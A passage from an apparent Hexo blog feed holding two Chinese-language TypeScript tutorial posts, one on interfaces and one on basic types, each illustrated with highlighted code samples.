class="comment">//     console.log(typeof arg.num)</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj1 = &#123;num: <span class="number">100</span>, str: <span class="string">'typescript'</span>&#125;</span><br><span class="line">demo(obj1) <span class="comment">// success -&gt; number</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj2 = &#123;num: <span class="string">'123'</span>, str: <span class="string">'typescript'</span>&#125;</span><br><span class="line">demo(obj2) <span class="comment">// error</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj3 = &#123;num: <span class="number">123</span>&#125;</span><br><span class="line">demo(obj3) <span class="comment">// error 缺少一个 str 参数</span></span><br></pre></td></tr></table></figure><p><strong>注意：定义接口的时候不需要使用 <code>=</code>，<code>{}</code> 内部必须使用 <code>分号(;)</code> 分隔。</strong></p><h4 id="接口的可选属性"><a href="#接口的可选属性" class="headerlink" title="接口的可选属性"></a>接口的可选属性</h4><p>接口里的属性不全都是必需的。 有些是只在某些条件下存在，或者根本不存在。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> T &#123;</span><br><span class="line">    num: <span class="built_in">number</span>;</span><br><span class="line">    str?: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">demo</span>(<span class="params">arg: T</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">typeof</span> arg.num)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj4 = &#123;num: <span class="number">100</span>, str: <span class="string">'typescript'</span>&#125;</span><br><span class="line">demo(obj4) <span class="comment">// success</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj5 = &#123;num: <span class="number">100</span>&#125;</span><br><span class="line">demo(obj5) <span class="comment">// success</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj6 = &#123;str: <span class="string">'typescript'</span>&#125;</span><br><span class="line">demo(obj6) <span class="comment">// error</span></span><br></pre></td></tr></table></figure><h4 id="接口的只读属性"><a href="#接口的只读属性" class="headerlink" title="接口的只读属性"></a>接口的只读属性</h4><p>这里的 <code>只读属性</code> 类似于原生javascript的 <code>const</code> 关键字，在赋值之后就不能更改了。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> Rd &#123;</span><br><span class="line">    readonly x: <span class="built_in">number</span>;</span><br><span class="line">    readonly y: <span class="built_in">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> r: Rd = &#123; x: <span class="number">100</span>, y: <span class="string">'str'</span> &#125;</span><br><span class="line"></span><br><span class="line">r.x = <span class="number">123</span>; <span class="comment">// -&gt; error</span></span><br></pre></td></tr></table></figure><h4 id="只读的数组"><a href="#只读的数组" class="headerlink" title="只读的数组"></a>只读的数组</h4><p>TypeScript具有 <code>ReadonlyArray&lt;T&gt;</code> 类型，它与 <code>Array&lt;T&gt;</code> 相似，只是把所有可变方法去掉了，因此可以确保数组创建后再也不能被修改。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr: ReadonlyArray&lt;<span class="built_in">number</span>&gt; = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">arr[<span class="number">0</span>] = <span class="number">2</span>; <span class="comment">// -&gt; error</span></span><br><span class="line">arr.push(<span class="number">5</span>); <span class="comment">// -&gt; error</span></span><br><span class="line">arr.length = <span class="number">10</span>; <span class="comment">// -&gt; error</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr1: <span class="built_in">Array</span>&lt;<span class="built_in">number</span>&gt; = arr;</span><br><span class="line"><span class="comment">// error, arr 是ReadonlyArray，不能赋值给别的数组</span></span><br></pre></td></tr></table></figure><h4 id="readonly还是const"><a href="#readonly还是const" class="headerlink" title="readonly还是const"></a>readonly还是const</h4><p>最简单判断该用readonly还是const的方法是看要把它做为变量使用还是做为一个属性。<br>做为变量使用的话用 const，若做为属性则使用readonly。</p><h4 id="额外的属性检查"><a href="#额外的属性检查" class="headerlink" title="额外的属性检查"></a>额外的属性检查</h4><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">interface</span> Pc &#123;</span><br><span class="line">    x?: <span class="built_in">number</span>;</span><br><span class="line">    y?: <span class="built_in">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">demo</span>(<span class="params">arg: Pc</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ..</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">demo(&#123;x: <span class="number">100</span>, z: <span class="number">110</span>&#125;)</span><br><span class="line"><span class="comment">// error，因为 z 并没有在接口 Pc 中定义</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用类型断言改写</span></span><br><span class="line">demo(&#123;x: <span class="number">100</span>, z: <span class="number">110</span>&#125; <span class="keyword">as</span> Pc)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 告诉 ts 入参 '&#123;x: 100, z: 110&#125;' 都是来自于 Pc 接口的，你别 tmd 再帮我检查了</span></span><br><span class="line"><span class="comment">// ts： 好吧，既然你这么确定，我就听你的。</span></span><br></pre></td></tr></table></figure><p>然后上面的这种做法并不是最佳的做法，最佳的做法是添加一个 <code>占位用的签名</code>。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 我不知道我后面还会传什么属性进来，所以我先用个 propsName 占个位置</span></span><br><span class="line"><span class="keyword">interface</span> Pc &#123;</span><br><span class="line">    x?: <span class="built_in">number</span>;</span><br><span class="line">    y?: <span class="built_in">string</span>;</span><br><span class="line">    [propName: <span class="built_in">string</span>]: <span class="built_in">any</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">demo(&#123;x: <span class="number">100</span>, z: <span class="number">110</span>&#125;)</span><br><span class="line"><span class="comment">// success</span></span><br></pre></td></tr></table></figure><h4 id="函数类型"><a href="#函数类型" class="headerlink" title="函数类型"></a>函数类型</h4><p>为了使用接口表示函数类型，我们需要给接口定义一个调用签名。 它就像是一个 <code>只有参数列表和返回值类型</code> 的函数定义。<br><strong>参数列表里的每个参数都需要名字和类型。</strong></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">interface</span> Fn &#123;</span><br><span class="line">    (a: <span class="built_in">number</span>, b: <span class="built_in">string</span>): <span class="built_in">boolean</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个 Fn 函数接口，该函数接受 a: number，b: string 作为参数，返回一个 boolean 值</span></span><br></pre></td></tr></table></figure><h4 id="可索引的类型"><a href="#可索引的类型" class="headerlink" title="可索引的类型"></a>可索引的类型</h4><p>可索引类型具有一个 <code>索引签名</code>，它描述了对象 <code>索引的类型</code>，还有相应的索引 <code>返回值类型</code>。<br>共有两种索引签名：字符串和数字。可以同时使用两种类型的索引，但是数字索引的返回值必须是字符串索引返回值类型的子类型。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 指定 索引类型 为 number</span></span><br><span class="line"><span class="keyword">interface</span> IndexNum &#123;</span><br><span class="line">    [index: <span class="built_in">number</span>]: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr: IndexNum = [<span class="string">'hello'</span>, <span class="string">'world'</span>];</span><br><span class="line"><span class="built_in">console</span>.log(arr[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 指定 索引类型 为 string</span></span><br><span class="line"><span class="keyword">interface</span> IndexStr &#123;</span><br><span class="line">    [index: <span class="built_in">string</span>]: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj: IndexStr = &#123;<span class="string">'x'</span>: <span class="string">'hello'</span>, <span class="string">'y'</span>: <span class="string">'world'</span>&#125;</span><br><span class="line"><span class="built_in">console</span>.log(obj[<span class="string">'x'</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 同时指定 索引类型 为 number 和 string</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> TotalIndex &#123;</span><br><span class="line">    [index: <span class="built_in">number</span>]: <span class="built_in">number</span>;</span><br><span class="line">    at: <span class="built_in">number</span>; <span class="comment">// success</span></span><br><span class="line">    where: <span class="built_in">string</span>; <span class="comment">// error 使用 where 获取值时返回的是 string 类型</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 只读的索引类型</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> RdIndex &#123;</span><br><span class="line">    readonly [index: <span class="built_in">number</span>]: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr: RdIndex = [<span class="string">'a'</span>,<span class="string">'b'</span>]</span><br><span class="line"></span><br><span class="line">arr[<span class="number">1</span>] = <span class="string">'c'</span>; <span class="comment">// error, arr 为只读的索引类型</span></span><br></pre></td></tr></table></figure><h4 id="‘类’类型"><a href="#‘类’类型" class="headerlink" title="‘类’类型"></a>‘类’类型</h4><p>和其它的类型约束相似，类类型使用 <code>implements</code> 实现接口。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义方式完全一致</span></span><br><span class="line"><span class="keyword">interface</span> C &#123;</span><br><span class="line">    date: <span class="built_in">Date</span>;</span><br><span class="line">    setTime(d: <span class="built_in">Date</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="keyword">class</span> Clock <span class="keyword">implements</span> C &#123;</span><br><span class="line">     <span class="comment">// 声明一个 date 属性，且约束该属性类型为 Date</span></span><br><span class="line">     <span class="comment">// 这种写法相当于 var date: Date</span></span><br><span class="line">     <span class="comment">// 只是声明并约束值类型，但并不赋值</span></span><br><span class="line">    date: <span class="built_in">Date</span>;</span><br><span class="line">    setTime(d: <span class="built_in">Date</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.date = d;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">constructor</span>(<span class="params">h: <span class="built_in">number</span>, m: <span class="built_in">number</span></span>) &#123;</span><br><span class="line">        <span class="comment">// ..</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于更多的 <code>implements</code> 的用法我目前也不是特别的清楚，所以下面就不再详细叙述了。<br>等我了解清楚之后再补上这一部分内容，你也可以通过查看<a href="https://www.tslang.cn/docs/handbook/interfaces.html" target="_blank" rel="noopener">官方文档</a>了解。</p><h4 id="继承接口"><a href="#继承接口" class="headerlink" title="继承接口"></a>继承接口</h4><p>和 <code>es2015</code> 中的 <code>extends</code> 一样，接口也是可以像类一样用来继承的。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> A &#123;</span><br><span class="line">    a: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> C &#123;</span><br><span class="line">    c: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> B <span class="keyword">extends</span> A, C &#123;</span><br><span class="line">    b: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj = &lt;B&gt;&#123;&#125;;</span><br><span class="line">obj.a = <span class="number">10</span>;</span><br><span class="line">obj.b = <span class="string">'10'</span>;</span><br><span class="line">obj.c = <span class="number">10</span>;</span><br></pre></td></tr></table></figure><h4 id="混合类型"><a href="#混合类型" class="headerlink" title="混合类型"></a>混合类型</h4><p><code>interface</code> 还可以在一个接口中约束 <code>javascript</code> 中多个类型；</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> Counter &#123;</span><br><span class="line">    a: <span class="built_in">number</span>; <span class="comment">// 约束 a 为 number 类型</span></span><br><span class="line">    getStr(): <span class="built_in">void</span>;<span class="comment">// 约束 getStr 无返回值；</span></span><br><span class="line">    (n: <span class="built_in">number</span>): <span class="built_in">string</span>;<span class="comment">// 约束匿名函数接受一个参数 n 为 number 类型，返回值 string 类型</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数 getCounter 返回值被 Counter 约束</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCounter</span>(<span class="params"></span>): <span class="title">Counter</span> </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> counter = &lt;Counter&gt;<span class="function"><span class="keyword">function</span> (<span class="params">start: <span class="built_in">number</span></span>) </span>&#123; &#125;; <span class="comment">// 类型断言</span></span><br><span class="line">    counter.interval = <span class="number">123</span>;</span><br><span class="line">    counter.reset = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; &#125;;</span><br><span class="line">    <span class="keyword">return</span> counter;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> c = getCounter();</span><br><span class="line">c(<span class="number">10</span>);</span><br><span class="line">c.reset();</span><br><span class="line">c.interval = <span class="number">5.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// 这个模版有问题，写 ts 的代码就会出问题</span></span><br><span class="line"><span class="comment">// 只能这样了</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure><h4 id="接口继承类"><a href="#接口继承类" class="headerlink" title="接口继承类"></a>接口继承类</h4><p>接口继承类时会继承父类所有的属性和方法，包括 <code>private</code> 和 <code>protected</code> 成员。<br>这意味着当你创建了一个接口继承了一个拥有 <code>私有或受保护的成员</code> 的类时，这个接口类型只能被 <code>这个类或其子类</code> 所实现（implement）。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> Control &#123;</span><br><span class="line">    <span class="keyword">private</span> state: <span class="built_in">any</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SelectableControl 含有 Control 所有的属性方法</span></span><br><span class="line"><span class="keyword">interface</span> SelectableControl <span class="keyword">extends</span> Control &#123;</span><br><span class="line">    select(): <span class="built_in">void</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Button 继承自 Control 含有 Control 所有的属性方法</span></span><br><span class="line"><span class="keyword">class</span> Button <span class="keyword">extends</span> Control <span class="keyword">implements</span> SelectableControl &#123;</span><br><span class="line">    select() &#123; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// TextBox 继承自 Control 含有 Control 所有的属性方法</span></span><br><span class="line"><span class="keyword">class</span> TextBox <span class="keyword">extends</span> Control &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Image 没有继承自 Control，没有 state 属性，无法实现 SelectableControl 接口</span></span><br><span class="line"><span class="comment">// 错误：“Image”类型缺少“state”属性。</span></span><br><span class="line"><span class="keyword">class</span> Image <span class="keyword">implements</span> SelectableControl &#123;</span><br><span class="line">    select() &#123; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本篇介绍 &lt;code&gt;typescript&lt;/code&gt; 中接口的使用方式。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Typescript学习日记(一)</title>
    <link href="https://github.com/TheNightElf/2017/01/08/Typescript%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://github.com/TheNightElf/2017/01/08/Typescript学习日记（一）/</id>
    <published>2017-01-08T08:14:30.000Z</published>
    <updated>2018-01-23T09:39:24.000Z</updated>
    
    <content type="html"><![CDATA[<p><code>javascript</code> 是运行在浏览器中的一门脚本语言，为了尽可能的减少内存的开支所以在设计之初它就是一门 <code>弱类型</code> 的语言。这在开发小而简单的应用时是可以为我们带来性能的提升，但是随着项目的扩大 <code>状态</code> 变的难以追踪将会引发很多的 <code>bug</code> 出现。<br>例子：<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typeof</span> test;</span><br><span class="line"><span class="comment">// -&gt; 'undefined'</span></span><br><span class="line"></span><br><span class="line">test = <span class="string">'str'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typeof</span> test;</span><br><span class="line"><span class="comment">// -&gt; 'string'</span></span><br><span class="line"></span><br><span class="line">test = <span class="number">123</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typeof</span> test;</span><br><span class="line"><span class="comment">// -&gt; 'number'</span></span><br></pre></td></tr></table></figure></p><a id="more"></a><h3 id="Typescript"><a href="#Typescript" class="headerlink" title="Typescript"></a>Typescript</h3><p><code>typescript</code> 是 <code>javascript</code> 的强类型版本。它会在编译期去掉类型和特有语法生成 <code>javascript</code> 代码。<code>typescript</code> 是 <code>javascript</code> 的超集，它支持所有 <code>javascript语法</code>，与此同时它又为 <code>javascript</code> 添加了 <code>静态类型检查</code> 使得 <code>javacript</code> 也拥有了 <code>强类型语言</code> 的特性。</p><h3 id="Typescript-基础类型"><a href="#Typescript-基础类型" class="headerlink" title="Typescript 基础类型"></a>Typescript 基础类型</h3><h4 id="布尔值-boolean"><a href="#布尔值-boolean" class="headerlink" title="布尔值(boolean)"></a>布尔值(boolean)</h4><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> bool: <span class="built_in">boolean</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">bool = <span class="number">123</span>;</span><br><span class="line"><span class="comment">// 报错，123是number类型而非boolean类型</span></span><br><span class="line"></span><br><span class="line">bool = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">// ok，true是一个boolean类型</span></span><br></pre></td></tr></table></figure><h4 id="数值-number"><a href="#数值-number" class="headerlink" title="数值(number)"></a>数值(number)</h4><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> num: <span class="built_in">number</span> = <span class="number">123</span>;</span><br><span class="line"></span><br><span class="line">num = <span class="string">'str'</span>;</span><br><span class="line"><span class="comment">// error</span></span><br><span class="line"></span><br><span class="line">num = <span class="number">456</span>;</span><br><span class="line"><span class="comment">// success</span></span><br></pre></td></tr></table></figure><h4 id="字符串-string"><a href="#字符串-string" class="headerlink" title="字符串(string)"></a>字符串(string)</h4><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> str: <span class="built_in">string</span> = <span class="string">'str'</span>;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure><h4 id="数组-array"><a href="#数组-array" class="headerlink" title="数组(array)"></a>数组(array)</h4><p><strong>定义方式：</strong><br>第一种，可以在 <code>元素类型</code> 后面接上 <code>[]</code>。<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr: <span class="built_in">number</span>[] = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br></pre></td></tr></table></figure></p><p>第二种，使用 <code>数组泛型</code> 定义。<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr: <span class="built_in">Array</span>&lt;<span class="built_in">number</span>&gt; = [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>];</span><br></pre></td></tr></table></figure></p><h4 id="元组-tuple"><a href="#元组-tuple" class="headerlink" title="元组(tuple)"></a>元组(tuple)</h4><p>元组类型允许表示一个已知元素数量和类型的数组(其实就是一个数组内包含多个类型的值)。<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> tup: [<span class="built_in">number</span>, <span class="built_in">string</span>] = [<span class="number">123</span>,<span class="string">'str'</span>];</span><br></pre></td></tr></table></figure></p><h4 id="枚举-enum"><a href="#枚举-enum" class="headerlink" title="枚举(enum)"></a>枚举(enum)</h4><p><code>enum</code> 类型是对JavaScript标准数据类型的一个补充。 像C#等其它语言一样，使用枚举类型可以为一组数值赋予友好的名字。<br><strong>用人话说就是：把一组值放到一个可迭代的对象中，然后给这个对象起了个名字。</strong></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> animal &#123;dog,cat,pig&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对象取值</span></span><br><span class="line"><span class="keyword">let</span> a: animal = animal.dog</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组取值</span></span><br><span class="line"><span class="keyword">let</span> b = animal[<span class="number">0</span>] <span class="comment">// -&gt; dog</span></span><br><span class="line"><span class="keyword">let</span> b = animal[<span class="number">1</span>] <span class="comment">// -&gt; cat</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以手动更改索引</span></span><br><span class="line"><span class="comment">// enum animal &#123;dog = 1, cat, pig&#125;</span></span><br><span class="line"><span class="comment">// let b = animal[1] // -&gt; dog</span></span><br><span class="line"><span class="comment">// let b = animal[2] // -&gt; cat</span></span><br></pre></td></tr></table></figure><h4 id="任何类型-any"><a href="#任何类型-any" class="headerlink" title="任何类型(any)"></a>任何类型(any)</h4><p>若是不清楚变量的具体类型可以指定为 <code>any</code>。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a: <span class="built_in">any</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">a = <span class="string">'str'</span>; <span class="comment">// success</span></span><br><span class="line">a = <span class="number">123</span>; <span class="comment">// success</span></span><br></pre></td></tr></table></figure><h4 id="无类型-void"><a href="#无类型-void" class="headerlink" title="无类型(void)"></a>无类型(void)</h4><p>与 <code>any</code> 相反。一个函数没有返回值的时候通常指定其返回值类型为 <code>void</code>。<br>一个 <code>void</code> 类型的变量只能赋值为 <code>undefined</code> | <code>null</code>。<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">noReturn</span>(<span class="params"></span>): <span class="title">void</span> </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'这个函数没有返回值'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> n: <span class="built_in">void</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="comment">// let n: void = undefined;</span></span><br></pre></td></tr></table></figure></p><h4 id="null和undefined"><a href="#null和undefined" class="headerlink" title="null和undefined"></a>null和undefined</h4><p><code>undefined</code>和<code>null</code>两者各自有自己的类型还是叫做<code>undefined</code>和<code>null</code>。</p><p><strong>默认情况下null和undefined是所有类型的子类型。 就是说你可以把 null和undefined赋值给number类型的变量。</strong></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> u: <span class="literal">undefined</span> = <span class="literal">undefined</span>;</span><br><span class="line"><span class="keyword">let</span> n: <span class="literal">null</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> num: <span class="built_in">number</span> = <span class="number">123</span>;</span><br><span class="line">num = <span class="literal">undefined</span>; <span class="comment">// 